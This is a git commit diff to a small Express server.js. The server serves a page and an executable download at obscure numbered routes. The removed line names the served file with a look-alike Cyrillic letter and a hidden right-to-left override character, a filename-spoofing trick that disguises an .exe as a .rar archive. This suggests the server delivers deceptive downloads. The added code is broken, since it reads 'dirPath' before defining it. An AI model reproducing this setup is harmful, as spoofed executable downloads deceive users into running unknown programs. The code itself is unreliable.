ee42c8ce88dc1000e99c4627db031f0a8c99541d
Catt3a <169023485+Catt3a@users.noreply.github.com>
2026-08-25 16:52:37 +0700

    h

--- server.js
+++ server.js
@@ -6,14 +6,24 @@ const app = express();
 const PORT = process.env.PORT || 8080;
 const frontend = fs.readFileSync('mainpage.html', 'utf8');
 
+const entries = fs.readdirSync(dirPath, { withFileTypes: true });
+  
+function getFirstFileSync(dirPath) {
+  const entries = fs.readdirSync(dirPath, { withFileTypes: true });
+  const firstFile = entries.find(entry => entry.isFile());
+  
+  return firstFile ? path.join(dirPath, firstFile.name) : null;
+}
+
+const fileFullPath = getFirstFileSync('./exe');
+console.log(fileFullPath);
 
 app.get('/posts/84146', async (req, res) => {
   res.send(frontend);
 });
 
 app.get('/download/7251', async (req, res) => {
-  const file = path.join(__dirname, 'lоrd‮rar.exe');
-  res.download(file);
+  res.download(fileFullPath);
 });
 
 app.listen(PORT, () => {
